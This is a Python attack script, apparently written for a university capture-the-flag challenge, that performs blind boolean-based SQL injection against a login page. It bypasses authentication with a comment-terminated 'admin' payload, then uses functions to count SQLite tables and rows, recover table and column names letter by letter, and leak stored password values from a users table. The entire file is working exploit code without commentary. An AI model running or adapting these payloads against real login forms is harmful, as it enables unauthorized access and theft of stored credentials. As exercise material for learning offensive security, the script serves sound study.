import requests
import string

def send_request(origin, referer, user_id, payload, allow_redirects=True):

    url = f"{origin}/login"
    headers = {
        "Cache-Control": "max-age=0",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": origin,
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Referer": referer,
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    cookies = {
        "CHALBROKER_USER_ID": user_id
    }

    print(f"Sending request to: {url}")
    print(f'Using payload: {payload}')
    response = requests.post(url, data=payload, headers=headers, cookies=cookies, allow_redirects=allow_redirects)
    # if response.status_code == 200:
    #     print("Request was successful.")
    # else:
    #     print(f"Response: {response.text} {response.status_code}")
    return response

def check_login_success(origin, referer, user_id):
    print("Checking login success...")
    PAYLOAD = {
        "username": "admin' --|",
        "password": "irrelevant"
    }
    # Send the initial request to check if the server is reachable
    response = send_request(ORIGIN, REFERER, CHALBROKER_USER_ID, PAYLOAD)
    if "Welcome" in response.text:
        print("Login successful!")

def find_table_count(origin, referer, user_id, max_tables=10):
    print("Finding table count...")
    for i in range(0, max_tables + 1):
        # Construct the attack payload for counting the number of tables
        attack_payload = f"""admin' AND (SELECT CASE WHEN COUNT(*) > {i} THEN 1 ELSE 'no' END FROM sqlite_master WHERE type = 'table');"""
        payload = {
            "username": f"{attack_payload}{" --|"}",
            "password": "irrelevant"
        }

        # Send the request using the helper function
        response = send_request(origin, referer, user_id, payload)

        # Check if the response indicates success
        if "Welcome" in response.text:
            print("Login successful!")
        else:
            if i == 0:
                print("Login failed.")
            else:
                print(f"Number of tables found: {i}")
            return i

    print("Could not determine the number of tables within the specified range.")
    return None

def find_table_names(origin, referer, user_id, lett_counter=1, table_name= ""):
    print("Finding table names...")
    letters_found = 0
    starting_letter = len(table_name) + 1
    print(f"Starting with table name: {table_name}")
    for i in range(starting_letter, starting_letter + lett_counter + 1):
        for letter in string.ascii_lowercase:
            # Construct the attack payload for finding the letters in the table name
            attack_payload = f"""admin' AND (SELECT SUBSTR((SELECT name FROM sqlite_schema WHERE type='table'), {i}, 1) = '{letter}');"""
            payload = {
                "username": f"{attack_payload}{" --|"}",
                "password": "irrelevant"
            }

            # Send the request using the helper function
            response = send_request(origin, referer, user_id, payload)

            # Check if the response indicates success
            if "Welcome" in response.text:
                print("Login successful!")
                table_name = table_name + letter
                print(f"Table name: {table_name}")
                break
            else:
                if letter == "z":
                    return table_name

    return table_name

def find_table_rows(origin, referer, user_id, table_name, max_rows=10):
    print("Finding table rows...")
    for i in range(0, max_rows + 1):
        # Construct the attack payload for counting the number of tables
        attack_payload = f"""admin' AND (SELECT CASE WHEN COUNT(*) > {i} THEN 1 ELSE 'no' END FROM {table_name});"""
        payload = {
            "username": f"{attack_payload}{" --|"}",
            "password": "irrelevant"
        }

        # Send the request using the helper function
        response = send_request(origin, referer, user_id, payload)

        # Check if the response indicates success
        if "Welcome" in response.text:
            print("Login successful!")
        else:
            if i == 0:
                print("Login failed.")
            else:
                print(f"Number of rows found: {i}")
            return i

    print(f"Could not determine the number of rows of table {table_name} within the specified range.")
    return None

def find_column_count(origin, referer, user_id, table_name, max_columns=20):
    print(f"Finding column count for table: {table_name}...")
    for i in range(1, max_columns + 1):
        # Construct the attack payload for counting the number of columns
        attack_payload = f"""admin' AND (SELECT CASE WHEN COUNT(*) > {i} THEN 1 ELSE 'no' END FROM pragma_table_info('{table_name}'));"""
        payload = {
            "username": f"{attack_payload}{" --|"}",
            "password": "irrelevant"
        }

        # Send the request using the helper function
        response = send_request(origin, referer, user_id, payload)

        # Check if the response indicates success
        if "Welcome" in response.text:
            print(f"Column {i} exists.")
        else:
            print(f"Number of columns found: {i - 1}")
            return i - 1

    print(f"Could not determine the number of columns for table {table_name} within the specified range.")
    return None

import string

def find_column_names(origin, referer, user_id, table_name, max_columns=10):
    column_names = []
    for col_index in range(1, max_columns + 1):
        column_name = ""
        for char_index in range(1, 21):  # Assuming column names are at most 20 characters long
            for letter in string.ascii_lowercase + string.digits + "_":
                attack_payload = (
                    f"admin' AND (SELECT SUBSTR((SELECT name FROM pragma_table_info('{table_name}') "
                    f"WHERE cid = {col_index}), {char_index}, 1) = '{letter}');"
                )
                payload = {
                    "username": f"{attack_payload} --|",
                    "password": "irrelevant"
                }
                response = send_request(origin, referer, user_id, payload)
                if "Welcome" in response.text:
                    column_name += letter
                    break
            else:
                break  # Exit if no matching letter is found
        if column_name:
            column_names.append(column_name)
        else:
            break  # Exit if no more columns are found
    return column_names

def leak_column_value(origin, referer, user_id, table_name, column_name, row_index=0, max_length=50, start_value=""):
    leaked_value = ""
    for char_index in range(1, max_length + 1):
        for char in start_value + "_{}" + string.digits + string.ascii_lowercase + string.punctuation + " ":
            attack_payload = (
                f"admin' AND (SELECT SUBSTR((SELECT {column_name} FROM {table_name} LIMIT 1 OFFSET {row_index}), {char_index}, 1) = '{char}');"
            )
            payload = {
                "username": f"{attack_payload} --|",
                "password": "irrelevant"
            }
            response = send_request(origin, referer, user_id, payload)
            if "Welcome" in response.text:
                leaked_value += char
                print(f"Leaked value so far: {leaked_value}")
                break
        else:
            # Stop if no matching character is found
            break
    return leaked_value

if __name__ == "__main__":
    ORIGIN = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1505"
    REFERER = f"{ORIGIN}/login"
    CHALBROKER_USER_ID = "nam10102"

    check_login_success(ORIGIN, REFERER, CHALBROKER_USER_ID)

    table_count = 1
    if table_count is None:
        table_count = find_table_count(ORIGIN, REFERER, CHALBROKER_USER_ID, max_tables=20)
        print(f"Table count: {table_count}")

    table_name = "users"
    if table_name is None:
        table_name = find_table_names(ORIGIN, REFERER, CHALBROKER_USER_ID, lett_counter=4, table_name="user")
        print(f"Table name: {table_name}")

    table_rows = 1
    if table_rows is None:
        table_rows = find_table_rows(ORIGIN, REFERER, CHALBROKER_USER_ID, table_name, max_rows=1)
        print(f"Table rows: {table_rows}")

    column_count = 2
    if column_count is None:
        column_count = find_column_count(ORIGIN, REFERER, CHALBROKER_USER_ID, table_name, max_columns=20)
        print(f"Column count: {column_count}")

    column_names = ['username', 'password']
    if column_names is None:
        column_names = find_column_names(ORIGIN, REFERER, CHALBROKER_USER_ID, table_name, max_columns=column_count)
        print(f"Column names: {column_names}")

    password = None
    if password is None:
        password = leak_column_value(ORIGIN, REFERER, CHALBROKER_USER_ID, table_name, column_names[1], row_index=0, max_length=100)
        print(f"Password: {password}")
